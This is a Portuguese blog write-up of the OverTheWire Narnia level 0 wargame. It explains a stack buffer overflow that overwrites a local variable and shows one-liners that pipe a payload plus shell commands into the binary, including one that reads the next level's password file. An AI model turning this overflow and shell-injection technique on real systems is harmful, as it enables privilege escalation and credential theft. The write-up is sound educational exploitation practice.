---
layout: default
title: Level 0 - Alterando variáveis locais com um stack overflow [OverTheWire CTF – Narnia] write-up
date: 2016-12-06 18:53
author: brennords
comments: true
categories: [CTFs]
---
Ok, depois terminar com os challs do <a href="https://brenn0.wordpress.com/category/ctfs/over-the-wire/leviathan/">Leviathan</a>, o negócio agora era subir de nível. Então, seguindo os conselhos da galera do <a href="http://overthewire.org/wargames/">Over The Wire</a>, prossegui para o <a href="http://overthewire.org/wargames/narnia/">Narnia</a>.

<blockquote>
This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it. The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky.
</blockquote>

Em uma tradução resumida: Narnia é para os que querem aprender o básico sobre exploração de software o/. Haverão programas com os tipos de bugs mais comuns e eles tentaram fazer que esses bugs fossem fáceis de explorar. E o código fonte dos progs alvos vão estar disponíveis para facilitar a vida.

Tudo muito bom, tudo muito bem. Hora de sujar as mãos e ficar mais cego por passar tanto tempo encarando a tela de um pc.

Não explicarei as coisas básicas que expliquei nos write-ups do <a href="https://brenn0.wordpress.com/category/ctfs/over-the-wire/leviathan/">Leviathan</a>. Caso se sinta perdido nesse aqui (ou nos próximos que seguirão), dê uma passada pelo link. Ou só grite para a mãe google quando alguma dúvida ser instanciada.

Hora de logar no ssh <strong>narnia.labs.overthewire.org</strong> com o user <strong>narnia0</strong> e repetir o user como password e começar nesta porra.

Na página da descrição, onde tem mais informações do que contei ali em cima, me disseram que os challs estariam em <strong>/narnia</strong>. Foi nessa hora que entrei no guarda roupa e... Tentei ser engraçado.

```narnia0@melinda:~$ cd /narnia
narnia0@melinda:/narnia$ ls
narnia0 narnia1.c narnia3 narnia4.c narnia6 narnia7.c
narnia0.c narnia2 narnia3.c narnia5 narnia6.c narnia8
narnia1 narnia2.c narnia4 narnia5.c narnia7 narnia8.c```

Executei o <strong>narnia0</strong> para descobrir qual era a história da vez:

```narnia0@melinda:/narnia$ ./narnia0
Correct val's value from 0x41414141 -0xdeadbeef!
Here is your chance: blabla
buf: blabla
val: 0x41414141
WAY OFF!!!!
```

Sem putaria, depois de dizer que era minha chance e pedir com que eu entrasse com algum dado qualquer, o programa me disse que estava <strong>WAY OFF!!!</strong> da flag.

Tenho uma leve, curta, quase nada, <strong>perto de 0</strong>, experiência com exploração de vulns básicas de software. Então depois de ver esse comportamento, saquei o que provavelmente seria preciso. Mas me deixe te explicar para que você me acompanhe nessa viagem por narnia (última tentativa de ser engraçado desperdiçada com sucesso).

Se você quer explorar alguma coisa, uma boa ideia é tentar conhece-la antes. Como o código fonte nos foi oferecido, não vamos abrir o gdb e tentar compreender asm.

https://gist.github.com/anonymous/b9358fd281269cc922e8b04aeec97066

No ínicio do programa, dá pra ver <strong>val</strong>. Declarada como <a href="http://linguagemc.com.br/tipos-de-dados-em-c/">long</a> e guardando o valor <a href="https://pt.stackoverflow.com/questions/13573/como-funcionam-os-n%C3%BAmeros-em-hexadecimal">hex</a> <strong>0x4141414</strong>. O objetivo é alterar o valor da mesma para <strong>0xbadbeef</strong>. E alterar sem o programa nos dar uma opção (direta) de fazer isso.

Seguindo para a linha seguinte de main, há um <a href="http://linguagemc.com.br/string-em-c-vetor-de-caracteres/">vetor de char</a> chamado <strong>buf</strong>. buf só aguenta guardar 20 desses chars.

Nas outras linhas, vemos printf fazendo seu trabalho: imprimindo mensagens para seja lá quem for que executar o programa.

A parte interessante é a linha 10. <strong>scanf("%24s",&amp;buf). </strong><a href="http://homepages.dcc.ufmg.br/~rodolfo/aedsi-2-10/printf_scanf/printfscanf.html">scanf</a> faz o que mandam. E o que mandam é que ele aceite uma string formada por 24 chars e salve em buf.

Pobre buf. Ela só aguenta 20 caracteres! Mas scanf não sabe disso e não se importa. Ela vai copiar os 24 caracteres para buf e se buf não aguentar tudo, que se foda o que estiver depois de buf.

Fim da historinha. Vamos a parte técnica da coisa.

Em um programa de computador, variáveis são declaradas. Estas variáveis precisam ser armazenadas em algum lugar, afinal, elas guardam dados que o programa irá usar durante sua execução. E no caso do programa que precisa ser explorado nesse chall, as variáveis ficam guardadas em um lugar chamado de <strong>stack</strong>.

(Muitas coisas serão explicadas bem brevemente e eu não sou nenhum especialista. Então, por favor, complemente o conteúdo que ler aqui com extensivas pesquisas e não considere que tudo esteja livre de erros. Deixarei links de referência em meio ao próprio post em algumas palavras chave.)

A Stack (tem gente que chama de Call Stack, mas somos íntimos) é uma região da memória que guarda dados. Estes dados são guardados como se estivessem empilhados um por cima do outro (daí o nome stack, pilha) e a regra para eles é conhecida como <strong>LIFO</strong>, que significa Last in, First Out (última a entrar, primeira a sair). Ou seja, o processo joga uma variável no stack, duas, três, quatro e cinco. E assim que elas ficam organizadas:

<img class="size-full wp-image-1328" src="https://brenn0.files.wordpress.com/2016/12/stack.gif" alt="Imagem roubada de: http://www.electronics.dit.ie/staff/tscarff/stack/stack.htm" width="224" height="253" />

Agora já tens ideia de como os dados ficam no stack, certo?

Quando uma função é chamada em um processo, o stack é usado para se criar um... Meio que "stack exclusivo" para aquela função. É conhecido como um<a href="https://pt.wikipedia.org/wiki/Pilha_de_chamada"><strong> stack frame</strong></a>. Peraê que tento explicar.

O stack frame de uma função fica responsável por guardar as variáveis locais da mesma e argumentos (caso existam). Ele não serve só para isso e guarda outras coisinhas, mas pelo objetivo do chall não vai ser necessário contar a história toda.

Vamos a função main do narnia0. No ínicio ela declara val e guarda nela o valor 0x41414141. Logo depois, declara um vetor de 20 chars. No stack, isso fica assim:

<img class="size-full wp-image-1336" src="https://brenn0.files.wordpress.com/2016/12/stack_horrivel3.png" alt="Antes de scanf copiar a entrada para buf." width="233" height="139" />

Mesmo que, quando a função main seja chamada, buf ainda não tenha um valor definido, o processo precisa reservar espaço no stack para receber esse valor.

Aí agora que começa a mágica.

Como falei antes, <strong>scanf("%24s",&amp;buf) </strong>tenta salvar em buf mais do que cabe. Já consegue deduzir o que acontece?

```narnia0@melinda:/narnia$ ./narnia0
Correct val's value from 0x41414141 -0xdeadbeef!
Here is your chance: BBBBBBBBBBBBBBBBBBBBBBBB
buf: BBBBBBBBBBBBBBBBBBBBBBBB
val: 0x42424242
WAY OFF!!!!
```

Exatamente. É assim que o stack vai ficar quando scanf mandar para a memória 4 caracteres a mais do que o que foi reservado para buf:

<img class="size-full wp-image-1337" src="https://brenn0.files.wordpress.com/2016/12/stack_horrivel2.png" alt="Os 4 B's extras são empurrados e atropelam val." width="224" height="140" />

O valor de val é sobreescrito porque o programa calculou errado o quanto de espaço seria necessário. Isso se chama <a href="https://pt.wikipedia.org/wiki/Transbordamento_de_dados">Buffer Overflow</a>. E aí que tá a chance de alterar val mesmo que o programa não nos dê uma opção direta.

Muito bom. Parecia simples. Passar 20 caracteres + 0xdeadbeef como entrada para buf e curtir uma /bin/sh como narnia1.

Se você é um bom observador, sabe que 0xdeadbeef não é uma simples string e sim um valor hexadecimal. Se estiver curioso, tente sobreescrever val o inserindo literalmente no programa e veja que resultado decepcionante.

Uma forma de passar esse valor pronto e bem formatado é usando o python. Meu "exploit" ficou assim:

```

print A*20 + \xef\xbe\xad\xde

```

Os "<em>\x</em>" avisam que os caracteres precisam ser interpretados como hexadecimais. Ah, e tem também o fato de o valor ter que ser passado com os bytes invertidos. Isto é necessário por causa da nossa arquitetura <a href="https://arqufs2008.wordpress.com/2008/05/26/little-endian-vs-big-endian/">Little Endian</a>.

Tudo pronto para funcionar.

```narnia0@melinda:/narnia$ python -c 'print A*20 + \xef\xbe\xad\xde' | ./narnia0
Correct val's value from 0x41414141 -0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
narnia0@melinda:/narnia$
```

Não houve mensagem de erro, mas também não ganhei nenhuma shell mais privilegiada. Nesse momento fiquei um pouco confuso. Usei o ltrace para tentar diagnosticar rapidamente o que poderia estar acontecendo.

```narnia0@melinda:/narnia$ python -c 'print A*20 + \xef\xbe\xad\xde' | ltrace ./narnia0
__libc_start_main(0x80484fd, 1, 0xffffd794, 0x80485a0 unfinished ...
puts(Correct val's value from 0x41414...Correct val's value from 0x41414141 -0xdeadbeef!
) = 51
printf(Here is your chance: ) = 21
__isoc99_scanf(0x8048679, 0xffffd6d8, 0x804a000, 0x80485f2) = 1
printf(buf: %s\n, AAAAAAAAAAAAAAAAAAAA\357\276\255\336Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ▒
) = 30
printf(val: 0x%08x\n, 0xdeadbeefval: 0xdeadbeef
) = 16
system(/bin/sh no return ...
--- SIGCHLD (Child exited) ---
... system resumed) = 0
+++ exited (status 0) +++
```

Aparentemente a shell é aberta mas é fechada logo depois, me deixando na merda.

O que fazer, o que fazer...

Passei um bom tempo pesquisando.

Tentando entender como <a href="https://linux.die.net/man/3/system">system</a> funcionava, criei um programa para fazer uns testes:

https://gist.github.com/anonymous/7e19de294370eebadaa0610d5ece8fa9

Compilei e o rodei para verificar se tudo funcionava como queria:

```narnia0@melinda:/tmp/0112$ gcc teste.c -oteste
narnia0@melinda:/tmp/0112$ ls
teste teste.c xpl
narnia0@melinda:/tmp/0112$ ./teste
$ exit
narnia0@melinda:/tmp/0112$ ltrace ./teste
__libc_start_main(0x40052d, 1, 0x7fffffffe6a8, 0x400550 unfinished ...
system(/bin/sh$ ls
teste teste.c xpl
$ exit
no return ...
--- SIGCHLD (Child exited) ---
... system resumed) = 0
+++ exited (status 0) +++
```

Tudo funcionando bem. O que eu queria descobrir era o comportamento da shell iniciada por system quando se passasse um input de outro comando via <a href="http://www.guiafoca.org/cgs/guia/iniciante/ch-redir.html">pipe</a> para o meu programa.

```narnia0@melinda:/tmp/0112$ python -c 'print ' | ./teste
narnia0@melinda:/tmp/0112$
```

Parecia que nada acontecia. Então usei o ltrace para confirmar minhas suspeitas:

```narnia0@melinda:/tmp/0112$ python -c 'print ' | ltrace ./teste
__libc_start_main(0x40052d, 1, 0x7fffffffe6a8, 0x400550 unfinished ...
system(/bin/sh no return ...
--- SIGCHLD (Child exited) ---
... system resumed) = 0
+++ exited (status 0) +++
```

Então coloquei na minha cabeça que isso tinha a ver com o pipe ("|"). Vasculhei pelo google informações sobre como ele funcionava e essas porra toda. Aprendi um bocado.

Mesmo assim, ainda não tenho uma teoria final sobre a razão desse comportamento. Pelo que li, <del>suspeito que o pipe feche os dois processos assim que meu primeiro comando finalize de enviar sua entrada (e assim o processo filho, a shell, tbm se acabe)...</del> (descartei essa teoria). Tive muitas viagens (uma pena ter perdido meu arquivo cheio das notas que fiz enquanto resolvia esse chall :(). Dentre os pensamentos, acabei achando que a solução seria dar um jeito de passar, além da entrada para buf, outra entrada que acabaria virando um comando na shell. Tudo via um único pipe.

Como passar o resultado de dois comandos como entrada para outro?

Fico feliz que você tenha perguntado.

Outra vez me vi vasculhando o google em busca de informação. Aprendi mais um bocado de coisas, mesmo assim nenhuma resposta "pronta". O que me deu a ideia final foi a leitura sobre <a href="https://en.wikibooks.org/wiki/A_Quick_Introduction_to_Unix/Shells_and_subshells">subshells</a>.

O nome é sugestivo. Uma subshell é uma shell dentro de outra shell.

```brenno@budweiser:~$ /bin/sh
$ whoami
brenno
$ exit
brenno@budweiser:~$
```

Eu sei. Não parece ser a resposta para a pergunta: como enviar a saída de dois comandos para outro. Mas é sim.

É possível executar um comando dentro de uma subshell sem precisar chama-la explicitamente. É só colocar o comando, ou comandos, entre parenteses e deixar a mágica rolar.

Daí então veio a ideia: executar dois comandos em uma subshell e passar pelo pipe para narnia0 e saber se minha lógica estaria correta e os resultados dos comandos seriam interpretados como duas entradas (uma para buf e outra para a shell).

```narnia0@melinda:/narnia$ (python -c'print A*20 + \xef\xbe\xad\xde'; python -c 'print whoami') | ./narnia0
Correct val's value from 0x41414141 -0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
narnia1
```

PROFIT! Esse narnia1 da última linha veio do whoami que mandei o python imprimir logo depois do exploit. Obviamente foi recebido pela shell aberta com o privilégios que são necessários para a flag.

```narnia0@melinda:/narnia$ (python -c'print A*20 + \xef\xbe\xad\xde'; python -c 'print cat /etc/narnia_pass/narnia1') | ./narnia0
Correct val's value from 0x41414141 -0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
Y3JldQ==```

Esse chall foi divertido e me fez pensar bastante. Write-up só demorou a sair e não ficou nem um pouco com a qualidade que eu esperava porque perdi meu arquivo com todas as notas mentais que criei enquanto tentava resolver.

Que venha narnia1.

Ps: se achou essa coisa de buffer overflow legal e quer ler um pouco mais sobre, dá uma sacada no meu <a href="https://brenn0.wordpress.com/2016/10/16/level-1-pwnage-linux-ringzer0team-writeup/">write-up do Level1 de pwnage linux do Ctf do RingZer0team</a>.
